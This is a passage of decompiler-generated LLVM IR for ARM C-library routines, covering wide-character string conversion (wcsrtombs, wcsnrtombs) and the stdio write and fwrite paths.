  store i32 %v2_12c1c, i32* @ip, align 4
  %v2_12c24 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_12c1c, i32* %stack_var_-16, align 4
  store i32 %v0_12c34, i32* %stack_var_-12, align 4
  %v5_12c3c = inttoptr i32 %v0_12c20 to i8*
  %v6_12c3c = call i32 @__GI_wcsnrtombs(i8* %v5_12c3c, i32 %v2_12c24, i32 1, i32 16, i32 %arg3)
  %v2_12c40 = icmp eq i32 %v6_12c3c, 0
  br i1 %v2_12c40, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_12c50 = phi i32 [ %v6_12c3c, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_12c00, i32* @lr, align 4
  ret i32 %v1_12c50

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_12c68 = load i32, i32* @r0, align 4
  %v1_12c68 = load i32, i32* @r1, align 4
  %v5_12c68 = inttoptr i32 %v0_12c68 to i8*
  %v6_12c68 = call i32 @__GI_wcsnrtombs(i8* %v5_12c68, i32 %v1_12c68, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_12c68

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12c78 = load i32, i32* @r4, align 4
  store i32 %v3_12c78, i32* %stack_var_-12, align 4
  %v10_12c7c = icmp eq i32 %tmp, %arg2
  store i1 %v10_12c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_12c7c, label %dec_label_pc_12c94, label %bb

bb:                                               ; preds = %entry
  %v4_12c80 = icmp eq i8* %arg1, null
  store i1 %v4_12c80, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_12c80, label %dec_label_pc_12c94.thread, label %bb39

dec_label_pc_12c94.thread:                        ; preds = %bb
  %v2_12c84 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_12c94:                               ; preds = %entry
  %v2_12c841 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_12c94 = icmp eq i8* %arg1, null
  store i1 %v3_12c94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12c94, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12c94
  store i32 %v2_12c841, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_12c94, %dec_label_pc_12c94.thread
  %storemerge20 = phi i32 [ %v2_12c841, %dec_label_pc_12c94 ], [ %v2_12c84, %dec_label_pc_12c94.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_12cf828 = phi i32 [ %v2_12c841, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_12cac = load i32, i32* @r3, align 4
  %v3_12cac = icmp uge i32 %v0_12cac, %arg3
  %arg3.v0_12cac = select i1 %v3_12cac, i32 %arg3, i32 %v0_12cac
  store i32 %arg3.v0_12cac, i32* %r5.global-to-local, align 4
  %v1_12cb8 = inttoptr i32 %arg2 to i32*
  %v2_12cb8 = load i32, i32* %v1_12cb8, align 4
  store i32 %v2_12cb8, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_12cac, i32* %r0.global-to-local, align 4
  %v2_12d0c22 = icmp eq i32 %arg3.v0_12cac, 0
  store i1 %v2_12d0c22, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12d0c22, label %dec_label_pc_12d14, label %dec_label_pc_12cc4

dec_label_pc_12cc4:                               ; preds = %.thread14.thread, %dec_label_pc_12d04.dec_label_pc_12cc4_crit_edge
  %v2_12cf8 = phi i32 [ %v2_12d04, %dec_label_pc_12d04.dec_label_pc_12cc4_crit_edge ], [ %v2_12cf828, %.thread14.thread ]
  %v0_12cd0 = phi i32 [ %v0_12cc4.pre, %dec_label_pc_12d04.dec_label_pc_12cc4_crit_edge ], [ %v2_12cb8, %.thread14.thread ]
  %v1_12cc4 = inttoptr i32 %v0_12cd0 to i32*
  %v2_12cc4 = load i32, i32* %v1_12cc4, align 4
  %v7_12cc8 = icmp eq i32 %v2_12cc4, 127
  store i1 %v7_12cc8, i1* %cpsr_z.global-to-local, align 1
  %v1_12ccc = urem i32 %v2_12cc4, 256
  store i32 %v1_12ccc, i32* @ip, align 4
  %v1_12cd0 = add i32 %v0_12cd0, 4
  store i32 %v1_12cd0, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_12cc4, 128
  br i1 %tmp45, label %dec_label_pc_12cf4, label %dec_label_pc_12cd8

dec_label_pc_12cd8:                               ; preds = %dec_label_pc_12cc4
  store i32 70536, i32* %r2.global-to-local, align 4
  %v0_12cdc = call i32 @__aeabi_read_tp()
  store i32 %v0_12cdc, i32* %r0.global-to-local, align 4
  %v3_12ce0 = load i16, i16* @global_var_24070.401, align 2
  %v4_12ce0 = sext i16 %v3_12ce0 to i32
  store i32 %v4_12ce0, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r1, align 4
  %v3_12cec = add i32 %v4_12ce0, %v0_12cdc
  %v4_12cec = inttoptr i32 %v3_12cec to i32*
  store i32 84, i32* %v4_12cec, align 4
  %v0_12d20.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12d20

dec_label_pc_12cf4:                               ; preds = %dec_label_pc_12cc4
  %v2_12cf4 = icmp eq i32 %v1_12ccc, 0
  store i1 %v2_12cf4, i1* %cpsr_z.global-to-local, align 1
  %v1_12cf8 = trunc i32 %v2_12cc4 to i8
  %v3_12cf8 = inttoptr i32 %v2_12cf8 to i8*
  store i8 %v1_12cf8, i8* %v3_12cf8, align 1
  %v0_12cfc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12cfc, label %.dec_label_pc_12d14_crit_edge, label %dec_label_pc_12d04

dec_label_pc_12d04:                               ; preds = %dec_label_pc_12cf4
  %v0_12d04 = load i32, i32* %lr.global-to-local, align 4
  %v1_12d04 = load i32, i32* %r4.global-to-local, align 4
  %v2_12d04 = add i32 %v1_12d04, %v0_12d04
  store i32 %v2_12d04, i32* %lr.global-to-local, align 4
  %v0_12d08 = load i32, i32* %r0.global-to-local, align 4
  %v1_12d08 = add i32 %v0_12d08, -1
  store i32 %v1_12d08, i32* %r0.global-to-local, align 4
  %v2_12d0c = icmp eq i32 %v1_12d08, 0
  store i1 %v2_12d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12d0c, label %dec_label_pc_12d14, label %dec_label_pc_12d04.dec_label_pc_12cc4_crit_edge

dec_label_pc_12d04.dec_label_pc_12cc4_crit_edge:  ; preds = %dec_label_pc_12d04
  %v0_12cc4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12cc4

.dec_label_pc_12d14_crit_edge:                    ; preds = %dec_label_pc_12cf4
  %v1_12cfc = load i32, i32* @ip, align 4
  store i32 %v1_12cfc, i32* %r2.global-to-local, align 4
  %v0_12d14.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12d14

dec_label_pc_12d14:                               ; preds = %dec_label_pc_12d04, %.dec_label_pc_12d14_crit_edge, %.thread14.thread
  %v0_12d14 = phi i32 [ %v0_12d14.pre, %.dec_label_pc_12d14_crit_edge ], [ %v2_12cf828, %.thread14.thread ], [ %v2_12d04, %dec_label_pc_12d04 ]
  %v1_12d14 = load i32, i32* @sp, align 4
  %v9_12d14 = icmp eq i32 %v0_12d14, %v1_12d14
  store i1 %v9_12d14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12d14, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_12d14
  %v1_12d18 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_12d18, i32* %v1_12cb8, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_12d14, %bb43
  %v0_12d1c = load i32, i32* %r0.global-to-local, align 4
  %v1_12d1c = load i32, i32* %r5.global-to-local, align 4
  %v2_12d1c = sub i32 %v1_12d1c, %v0_12d1c
  store i32 %v2_12d1c, i32* @r1, align 4
  br label %dec_label_pc_12d20

dec_label_pc_12d20:                               ; preds = %dec_label_pc_12cd8, %bb44
  %v0_12d20 = phi i32 [ %v0_12d20.pre, %dec_label_pc_12cd8 ], [ %v2_12d1c, %bb44 ]
  store i32 %v0_12d20, i32* %r0.global-to-local, align 4
  %v2_12d28 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12d28, i32* %r4.global-to-local, align 4
  ret i32 %v0_12d20

; uselistorder directives
  uselistorder i32 %v0_12d20, { 1, 0 }
  uselistorder i32 %v1_12d08, { 1, 0 }
  uselistorder i32 %v2_12d04, { 0, 2, 1 }
  uselistorder i32 %v1_12ccc, { 1, 0 }
  uselistorder i32 %v2_12cc4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_12cf828, { 1, 0 }
  uselistorder i32 %v2_12c841, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 4, 2, 3, 5, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 6, 1, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 2, 5, 0, 3, 1, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 6, 3, 4, 5, 0, 7, 1, 8, 9 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12d20, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_12d14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12cc4, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v15_12d34 = load i32, i32* @r8, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_12df82 = icmp eq i32 %arg3, 0
  store i1 %v2_12df82, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12df82, label %dec_label_pc_12e00, label %dec_label_pc_12d50

dec_label_pc_12d50:                               ; preds = %entry, %dec_label_pc_12df8thread-pre-split.dec_label_pc_12d50_crit_edge
  %v0_12d5c = phi i32 [ %v0_12d5c.pre, %dec_label_pc_12df8thread-pre-split.dec_label_pc_12d50_crit_edge ], [ %tmp, %entry ]
  %v0_12d58 = phi i32 [ %v5_12d68, %dec_label_pc_12df8thread-pre-split.dec_label_pc_12d50_crit_edge ], [ %arg2, %entry ]
  %v3_12d50 = phi i32 [ %v3_12d50.pre, %dec_label_pc_12df8thread-pre-split.dec_label_pc_12d50_crit_edge ], [ 2147483647, %entry ]
  %v0_12d54.in = phi i32 [ %v5_12d6c, %dec_label_pc_12df8thread-pre-split.dec_label_pc_12d50_crit_edge ], [ %arg3, %entry ]
  %v3_12d54 = phi i32 [ %v5_12d6c, %dec_label_pc_12df8thread-pre-split.dec_label_pc_12d50_crit_edge ], [ %arg3, %entry ]
  %v0_12d54 = icmp slt i32 %v0_12d54.in, 0
  %storemerge = select i1 %v0_12d54, i32 %v3_12d50, i32 %v3_12d54
  store i32 %storemerge, i32* @r2, align 4
  %v1_12d5c = add i32 %v0_12d5c, 4
  %v2_12d5c = inttoptr i32 %v1_12d5c to i32*
  %v3_12d5c = load i32, i32* %v2_12d5c, align 4
  %v3_12d60 = call i32 @__GI___libc_write(i32 %v3_12d5c, i32 %v0_12d58)
  %v1_12d64 = icmp slt i32 %v3_12d60, 0
  %v2_12d64 = icmp eq i32 %v3_12d60, 0
  store i1 %v2_12d64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_12d64, label %dec_label_pc_12d74, label %dec_label_pc_12df8thread-pre-split

dec_label_pc_12d74:                               ; preds = %dec_label_pc_12d50
  %v0_12d74 = load i32, i32* @r4, align 4
  %v1_12d74 = inttoptr i32 %v0_12d74 to i16*
  %v2_12d74 = load i16, i16* %v1_12d74, align 2
  %v1_12d78 = or i16 %v2_12d74, 8
  store i16 %v1_12d78, i16* %v1_12d74, align 2
  store i32 70368, i32* %r3.global-to-local, align 4
  %v0_12d84 = call i32 @__aeabi_read_tp()
  %v3_12d88 = load i16, i16* @global_var_24070.401, align 2
  %v4_12d88 = sext i16 %v3_12d88 to i32
  store i32 %v4_12d88, i32* %r3.global-to-local, align 4
  %v2_12d8c = add i32 %v4_12d88, %v0_12d84
  %v3_12d8c = inttoptr i32 %v2_12d8c to i32*
  %v4_12d8c = load i32, i32* %v3_12d8c, align 4
  store i32 %v4_12d8c, i32* %r3.global-to-local, align 4
  %v7_12d90 = icmp eq i32 %v4_12d8c, 4
  store i1 %v7_12d90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12d90, label %dec_label_pc_12d9c, label %bb21

bb21:                                             ; preds = %dec_label_pc_12d74
  %v8_12d94 = icmp eq i32 %v4_12d8c, 11
  store i1 %v8_12d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12d94, label %dec_label_pc_12d9c, label %dec_label_pc_12e00

dec_label_pc_12d9c:                               ; preds = %dec_label_pc_12d74, %bb21
  %v0_12d9c = load i32, i32* @r4, align 4
  %v1_12d9c = add i32 %v0_12d9c, 8
  store i32 %v1_12d9c, i32* %r2.global-to-local, align 4
  %v1_12da0 = inttoptr i32 %v1_12d9c to i32*
  %v2_12da0 = load i32, i32* %v1_12da0, align 4
  store i32 %v2_12da0, i32* %r2.global-to-local, align 4
  %v3_12da0 = add i32 %v0_12d9c, 12
  %v4_12da0 = inttoptr i32 %v3_12da0 to i32*
  %v5_12da0 = load i32, i32* %v4_12da0, align 4
  store i32 %v5_12da0, i32* %r3.global-to-local, align 4
  %v2_12da4 = sub i32 %v5_12da0, %v2_12da0
  store i32 %v2_12da4, i32* @r1, align 4
  %v9_12da4 = icmp eq i32 %v5_12da0, %v2_12da0
  store i1 %v9_12da4, i1* %cpsr_z.global-to-local, align 1
  %v0_12df0.pre = load i32, i32* @r5, align 4
  br i1 %v9_12da4, label %dec_label_pc_12df0, label %dec_label_pc_12dac

dec_label_pc_12dac:                               ; preds = %dec_label_pc_12d9c
  %v3_12dac = icmp ult i32 %v2_12da4, %v0_12df0.pre
  %v9_12dac = icmp eq i32 %v2_12da4, %v0_12df0.pre
  store i1 %v9_12dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12dac, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_12dac
  store i32 %v0_12df0.pre, i32* @r1, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_12dac, %bb22, %dec_label_pc_12dd4
  %v2_12dc0 = phi i32 [ %v1_12dd8, %dec_label_pc_12dd4 ], [ %v2_12da0, %bb22 ], [ %v2_12da0, %dec_label_pc_12dac ]
  %v0_12db4 = load i32, i32* @r6, align 4
  %v1_12db4 = inttoptr i32 %v0_12db4 to i8*
  %v2_12db4 = load i8, i8* %v1_12db4, align 1
  %v3_12db4 = zext i8 %v2_12db4 to i32
  store i32 %v3_12db4, i32* %r3.global-to-local, align 4
  %v7_12db8 = icmp eq i8 %v2_12db4, 10
  store i1 %v7_12db8, i1* %cpsr_z.global-to-local, align 1
  %v1_12dbc = add i32 %v0_12db4, 1
  store i32 %v1_12dbc, i32* @r6, align 4
  %v3_12dc0 = inttoptr i32 %v2_12dc0 to i8*
  store i8 %v2_12db4, i8* %v3_12dc0, align 1
  %v0_12dc4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12dc4, label %dec_label_pc_12dc8, label %dec_label_pc_12dd4

dec_label_pc_12dc8:                               ; preds = %.preheader
  %v0_12dc8 = load i32, i32* @r4, align 4
  %v1_12dc8 = inttoptr i32 %v0_12dc8 to i16*
  %v2_12dc8 = load i16, i16* %v1_12dc8, align 2
  %v3_12dc8 = zext i16 %v2_12dc8 to i32
  store i32 %v3_12dc8, i32* %r3.global-to-local, align 4
  %v1_12dcc = and i32 %v3_12dc8, 256
  %v2_12dcc = icmp eq i32 %v1_12dcc, 0
  store i1 %v2_12dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12dcc, label %dec_label_pc_12dd4, label %dec_label_pc_12dc8.dec_label_pc_12de0_crit_edge

dec_label_pc_12dc8.dec_label_pc_12de0_crit_edge:  ; preds = %dec_label_pc_12dc8
  %v0_12de4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12de0

dec_label_pc_12dd4:                               ; preds = %dec_label_pc_12dc8, %.preheader
  %v0_12dd4 = load i32, i32* @r1, align 4
  %v1_12dd4 = add i32 %v0_12dd4, -1
  store i32 %v1_12dd4, i32* @r1, align 4
  %v7_12dd4 = icmp eq i32 %v0_12dd4, 1
  store i1 %v7_12dd4, i1* %cpsr_z.global-to-local, align 1
  %v0_12dd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_12dd8 = add i32 %v0_12dd8, 1
  store i32 %v1_12dd8, i32* %r2.global-to-local, align 4
  br i1 %v7_12dd4, label %dec_label_pc_12dd4.dec_label_pc_12de0_crit_edge, label %.preheader

dec_label_pc_12dd4.dec_label_pc_12de0_crit_edge:  ; preds = %dec_label_pc_12dd4
  %v0_12de0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12de0

dec_label_pc_12de0:                               ; preds = %dec_label_pc_12dc8.dec_label_pc_12de0_crit_edge, %dec_label_pc_12dd4.dec_label_pc_12de0_crit_edge
  %v0_12de4 = phi i32 [ %v1_12dd8, %dec_label_pc_12dd4.dec_label_pc_12de0_crit_edge ], [ %v0_12de4.pre, %dec_label_pc_12dc8.dec_label_pc_12de0_crit_edge ]
  %v0_12de0 = phi i32 [ %v0_12de0.pre, %dec_label_pc_12dd4.dec_label_pc_12de0_crit_edge ], [ %v0_12dc8, %dec_label_pc_12dc8.dec_label_pc_12de0_crit_edge ]
  %v1_12de0 = add i32 %v0_12de0, 8
  %v2_12de0 = inttoptr i32 %v1_12de0 to i32*
  %v3_12de0 = load i32, i32* %v2_12de0, align 4
  store i32 %v3_12de0, i32* %r3.global-to-local, align 4
  %v2_12de4 = add i32 %v0_12de0, 16
  %v3_12de4 = inttoptr i32 %v2_12de4 to i32*
  store i32 %v0_12de4, i32* %v3_12de4, align 4
  %v0_12de8 = load i32, i32* %r3.global-to-local, align 4
  %v1_12de8 = load i32, i32* %r2.global-to-local, align 4
  %v2_12de8 = sub i32 %v1_12de8, %v0_12de8
  store i32 %v2_12de8, i32* %r3.global-to-local, align 4
  %v1_12dec = load i32, i32* @r5, align 4
  %v2_12dec = sub i32 %v1_12dec, %v2_12de8
  br label %dec_label_pc_12df0

dec_label_pc_12df0:                               ; preds = %dec_label_pc_12d9c, %dec_label_pc_12de0
  %v0_12df0 = phi i32 [ %v2_12dec, %dec_label_pc_12de0 ], [ %v0_12df0.pre, %dec_label_pc_12d9c ]
  %v1_12df0 = load i32, i32* @r7, align 4
  %v2_12df0 = sub i32 %v1_12df0, %v0_12df0
  store i32 %v2_12df0, i32* @r7, align 4
  br label %dec_label_pc_12e00

dec_label_pc_12df8thread-pre-split:               ; preds = %dec_label_pc_12d50
  %v3_12d68 = load i32, i32* @r6, align 4
  %v5_12d68 = add i32 %v3_12d68, %v3_12d60
  store i32 %v5_12d68, i32* @r6, align 4
  %v4_12d6c = load i32, i32* @r5, align 4
  %v5_12d6c = sub i32 %v4_12d6c, %v3_12d60
  store i32 %v5_12d6c, i32* @r5, align 4
  %v2_12df8 = icmp eq i32 %v5_12d6c, 0
  store i1 %v2_12df8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12df8, label %dec_label_pc_12e00, label %dec_label_pc_12df8thread-pre-split.dec_label_pc_12d50_crit_edge

dec_label_pc_12df8thread-pre-split.dec_label_pc_12d50_crit_edge: ; preds = %dec_label_pc_12df8thread-pre-split
  %v3_12d50.pre = load i32, i32* @r8, align 4
  %v0_12d5c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12d50

dec_label_pc_12e00:                               ; preds = %dec_label_pc_12df8thread-pre-split, %entry, %bb21, %dec_label_pc_12df0
  %v0_12e00 = load i32, i32* @r7, align 4
  store i32 %v15_12d34, i32* @r8, align 4
  ret i32 %v0_12e00

; uselistorder directives
  uselistorder i32 %v5_12d6c, { 1, 3, 0, 2 }
  uselistorder i32 %v5_12d68, { 1, 0 }
  uselistorder i32 %v0_12de0, { 1, 0 }
  uselistorder i32 %v1_12dd8, { 0, 2, 1 }
  uselistorder i32 %v0_12dd4, { 1, 0 }
  uselistorder i32 %v0_12df0.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_12da0, { 1, 0, 2 }
  uselistorder i32 %v2_12da0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_12d60, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_12e00, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_12df0, { 1, 0 }
  uselistorder label %dec_label_pc_12de0, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12d9c, { 1, 0 }
  uselistorder label %dec_label_pc_12d50, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_12e10 = load i32, i32* @r4, align 4
  store i32 %v3_12e10, i32* %stack_var_-20, align 4
  %v6_12e10 = load i32, i32* @r5, align 4
  %v9_12e10 = load i32, i32* @r6, align 4
  %v12_12e10 = load i32, i32* @r7, align 4
  %v3_12e14 = load i16, i16* %arg3, align 2
  %v4_12e14 = zext i16 %v3_12e14 to i32
  store i32 %v4_12e14, i32* @r3, align 4
  %v1_12e18 = and i32 %v4_12e14, 512
  store i32 %v1_12e18, i32* @r4, align 4
  %v2_12e18 = icmp eq i32 %v1_12e18, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_12e18, label %dec_label_pc_12e30, label %dec_label_pc_12f2c

dec_label_pc_12e30:                               ; preds = %entry
  %v2_12e30 = add i32 %tmp, 4
  %v3_12e30 = inttoptr i32 %v2_12e30 to i32*
  %v4_12e30 = load i32, i32* %v3_12e30, align 4
  %v2_12e38 = add i32 %tmp, 16
  %v3_12e38 = inttoptr i32 %v2_12e38 to i32*
  %v4_12e38 = load i32, i32* %v3_12e38, align 4
  store i32 %v4_12e38, i32* @r0, align 4
  %v2_12e3c = add i32 %tmp, 12
  %v3_12e3c = inttoptr i32 %v2_12e3c to i32*
  %v4_12e3c = load i32, i32* %v3_12e3c, align 4
  store i32 %v4_12e3c, i32* @r3, align 4
  %v4_12e40 = icmp eq i32 %v4_12e30, -2
  %v2_12e44 = sub i32 %v4_12e3c, %v4_12e38
  br i1 %v4_12e40, label %dec_label_pc_12e44, label %dec_label_pc_12e6c

dec_label_pc_12e44:                               ; preds = %dec_label_pc_12e30
  %v3_12e48 = icmp ugt i32 %v2_12e44, %arg2
  br i1 %v3_12e48, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_12e44
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_12e44, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_12e44, %dec_label_pc_12e44 ]
  %v0_12e50 = phi i32 [ %arg2, %bb ], [ %v2_12e44, %dec_label_pc_12e44 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_12e50, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_12e58 = call i32 @memcpy()
  %v0_12e5c = load i32, i32* @r5, align 4
  %v1_12e5c = add i32 %v0_12e5c, 16
  %v2_12e5c = inttoptr i32 %v1_12e5c to i32*
  %v3_12e5c = load i32, i32* %v2_12e5c, align 4
  %v1_12e60 = load i32, i32* @r4, align 4
  %v2_12e60 = add i32 %v1_12e60, %v3_12e5c
  store i32 %v2_12e60, i32* %v2_12e5c, align 4
  br label %dec_label_pc_12f40

dec_label_pc_12e6c:                               ; preds = %dec_label_pc_12e30
  store i32 %v2_12e44, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_12e44, %arg2
  br i1 %tmp18, label %dec_label_pc_12f0c, label %dec_label_pc_12e78

dec_label_pc_12e78:                               ; preds = %dec_label_pc_12e6c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_12e80 = call i32 @memcpy()
  %v0_12e84 = load i32, i32* @r5, align 4
  %v1_12e84 = add i32 %v0_12e84, 16
  %v2_12e84 = inttoptr i32 %v1_12e84 to i32*
  %v3_12e84 = load i32, i32* %v2_12e84, align 4
  %v1_12e88 = inttoptr i32 %v0_12e84 to i16*
  %v2_12e88 = load i16, i16* %v1_12e88, align 2
  %v1_12e8c = load i32, i32* @r6, align 4
  %v2_12e8c = add i32 %v1_12e8c, %v3_12e84
  %v1_12e90 = and i16 %v2_12e88, 256
  %v2_12e90 = icmp eq i16 %v1_12e90, 0
  store i32 %v2_12e8c, i32* %v2_12e84, align 4
  br i1 %v2_12e90, label %dec_label_pc_12f40, label %dec_label_pc_12e9c

dec_label_pc_12e9c:                               ; preds = %dec_label_pc_12e78
  %v0_12e9c = load i32, i32* @r7, align 4
  %v0_12ea4 = load i32, i32* @r6, align 4
  %v4_12ea8 = call i32 @memrchr(i32 %v0_12e9c, i32 10, i32 %v0_12ea4, i32 %v2_12e8c)
  %v2_12eac = icmp eq i32 %v4_12ea8, 0
  br i1 %v2_12eac, label %dec_label_pc_12f40, label %dec_label_pc_12eb4

dec_label_pc_12eb4:                               ; preds = %dec_label_pc_12e9c
  %v0_12eb4 = load i32, i32* @r5, align 4
  store i32 %v0_12eb4, i32* @r0, align 4
  %v0_12eb8 = call i32 @__stdio_wcommit()
  %v2_12ebc = icmp eq i32 %v0_12eb8, 0
  br i1 %v2_12ebc, label %dec_label_pc_12f40, label %dec_label_pc_12ec4

dec_label_pc_12ec4:                               ; preds = %dec_label_pc_12eb4
  %v1_12ec4 = load i32, i32* @r6, align 4
  %v3_12ec4 = icmp uge i32 %v0_12eb8, %v1_12ec4
  %v1_12ec4.v0_12eb8 = select i1 %v3_12ec4, i32 %v1_12ec4, i32 %v0_12eb8
  store i32 %v1_12ec4.v0_12eb8, i32* @r4, align 4
  %v2_12ed0 = sub i32 %v1_12ec4, %v1_12ec4.v0_12eb8
  %v0_12ed4 = load i32, i32* @r7, align 4
  %v2_12ed4 = add i32 %v0_12ed4, %v2_12ed0
  store i32 %v2_12ed4, i32* %r7.global-to-local, align 4
  store i32 %v2_12ed4, i32* @r0, align 4
  store i32 %v1_12ec4.v0_12eb8, i32* @r2, align 4
  %v4_12ee4 = call i32 @__GI_memchr(i32 %v2_12ed4, i32 10, i32 %v1_12ec4.v0_12eb8, i32 %v2_12ed0)
  %v2_12ee8 = icmp eq i32 %v4_12ee4, 0
  br i1 %v2_12ee8, label %dec_label_pc_12f40, label %dec_label_pc_12ef0

dec_label_pc_12ef0:                               ; preds = %dec_label_pc_12ec4
  %v0_12ef0 = load i32, i32* @r5, align 4
  %v1_12ef0 = add i32 %v0_12ef0, 16
  %v2_12ef0 = inttoptr i32 %v1_12ef0 to i32*
  %v3_12ef0 = load i32, i32* %v2_12ef0, align 4
  %v0_12ef4 = load i32, i32* %r7.global-to-local, align 4
  %v1_12ef4 = load i32, i32* @r4, align 4
  %v2_12ef4 = sub i32 %v0_12ef4, %v4_12ee4
